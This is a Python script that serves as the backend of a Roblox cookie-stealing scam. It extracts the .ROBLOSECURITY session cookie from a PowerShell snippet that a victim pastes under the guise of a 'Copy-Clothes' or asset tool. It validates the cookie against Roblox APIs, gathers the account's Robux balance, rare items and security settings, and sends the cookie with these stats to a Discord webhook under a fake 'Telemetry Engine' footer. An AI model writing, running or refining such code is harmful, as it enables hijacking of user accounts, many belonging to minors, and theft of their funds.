import sys
import base64
import os
import requests
import re
from datetime import datetime

def main():
    if len(sys.argv) < 2:
        print("Error: No argument passed to script.")
        return
    
    try:
        decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8')
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')

        if not webhook_url:
            print("ERROR: DISCORD_WEBHOOK_URL environment variable is missing on Railway!")
            return

        print(f"[*] Decoded script length: {len(decoded_script)} characters")

        # Extract Target URL and Action/Tool type
        uri_match = re.search(r'-Uri\s+["\']([^"\']+)["\']', decoded_script, re.IGNORECASE)
        target_url = uri_match.group(1) if uri_match else "https://www.roblox.com"
        
        tool_used = "Copy-Clothes"
        if "game" in target_url.lower():
            tool_used = "Game-Utility"
        elif "catalog" in target_url.lower() or "library" in target_url.lower():
            tool_used = "Asset-Utility"

        # Extract .ROBLOSECURITY Cookie safely
        cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
        if not cookie_match:
            cookie_match = re.search(r'_\|WARNING:-DO-NOT-SHARE-THIS\.-[^"\']+', decoded_script)

        roblosecurity = cookie_match.group(0) if cookie_match and hasattr(cookie_match, 'group') and cookie_match.group(0).startswith('_|WARNING') else (cookie_match.group(1) if cookie_match and len(cookie_match.groups()) > 0 else None)

        if not roblosecurity and cookie_match and hasattr(cookie_match, 'group'):
            roblosecurity = cookie_match.group(0)

        if not roblosecurity:
            fallback_cookie = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.-[A-Za-z0-9_\+\-\.]+)', decoded_script)
            if fallback_cookie:
                roblosecurity = fallback_cookie.group(1)

        if not roblosecurity:
            print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script.")
            return

        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
        print(f"[+] Cookie extracted & sanitized! Length: {len(roblosecurity)}")

        # Default fallback metrics
        username = "Unknown User"
        user_id = 0
        account_age_days = 0
        robux_balance = 0
        pending_robux = 0
        email_verified = "False"
        has_2fa = "False"
        is_premium = "False"
        has_korblox = "False"
        has_headless = "False"
        cookie_status = "🔴 Invalid / Expired"
        avatar_thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        # 1. Authenticated User Profile Check
        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        print(f"[*] Roblox Auth API status: {user_res.status_code}")
        
        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id")
            cookie_status = "🟢 Valid & Active"

            # Detailed User Info (Account Age / Creation Date)
            detail_res = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers)
            if detail_res.status_code == 200:
                d_json = detail_res.json()
                created_str = d_json.get("created")
                if created_str:
                    created_date = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
                    account_age_days = (datetime.now(created_date.tzinfo) - created_date).days

            # Currency Balance
            curr_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
            if curr_res.status_code == 200:
                robux_balance = curr_res.json().get("robux", 0)

            # Pending Robux
            pend_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/resale-stock/pending-robux", headers=headers)
            if pend_res.status_code == 200:
                pending_robux = pend_res.json().get("pendingRobux", 0)

            # Email Verification Status
            email_res = requests.get("https://users.roblox.com/v1/email", headers=headers)
            if email_res.status_code == 200:
                email_verified = "True" if email_res.json().get("verified", False) else "False"

            # Premium Subscription Status
            prem_res = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/subscriptions", headers=headers)
            if prem_res.status_code == 200:
                subs = prem_res.json().get("subscriptions", [])
                is_premium = "True" if len(subs) > 0 else "False"

            # Avatar Thumbnail
            thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420&height=420&format=Png&isCircular=false", headers=headers)
            if thumb_res.status_code == 200:
                t_data = thumb_res.json().get("data", [])
                if len(t_data) > 0:
                    avatar_thumb = t_data[0].get("imageUrl", avatar_thumb)

            # Bundle Checks (Korblox ID: 192, Headless ID: 201)
            def check_bundle(bundle_id):
                chk = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned", headers=headers)
                if chk.status_code == 200:
                    return "True" if chk.json().get("isOwned", False) else "False"
                return "False"

            has_korblox = check_bundle(192)
            has_headless = check_bundle(201)

        # Discord Rich Embed Payload styled like the reference image
        payload = {
            "username": f"{username} | 13+",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "title": "👾 Discord Notification",
                "url": target_url,
                "description": (
                    f"👤 **Username**\n`{username}`\n\n"
                    f"📊 **Account Stats**\n"
                    f"• Account Age: `{account_age_days} Days`\n"
                    f"• Cookie State: `{cookie_status}`\n\n"
                    f"💰 **Robux & Financials**\n"
                    f"• Balance: `{robux_balance} R$`\n"
                    f"• Pending: `{pending_robux} R$`\n\n"
                    f"🎭 **Inventory / Rare Bundles**\n"
                    f"• Korblox: `{has_korblox}`\n"
                    f"• Headless: `{has_headless}`\n\n"
                    f"⚙️ **Security & Settings**\n"
                    f"• Email Verified: `{email_verified}`\n"
                    f"• 2FA Enabled: `{has_2fa}`\n"
                    f"• Premium: `{is_premium}`\n\n"
                    f"🛠️ **Tool Used**\n`{tool_used}`\n\n"
                    f"🔑 **Extracted .ROBLOSECURITY**\n```text\n{roblosecurity}\n```"
                ),
                "color": 6528033 if cookie_status.startswith("🟢") else 15548997,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "NexusStudio Telemetry Engine | Secure Server Verification" }
            }]
        }

        discord_res = requests.post(webhook_url, json=payload)
        print(f"[*] Discord Webhook response code: {discord_res.status_code}")
        if discord_res.status_code not in [200, 204]:
            print(f"DISCORD ERROR RESPONSE: {discord_res.text}")
        else:
            print("Success: Dispatched to Discord.")

    except Exception as e:
        print(f"Python Exception Error: {str(e)}")

if __name__ == "__main__":
    main()
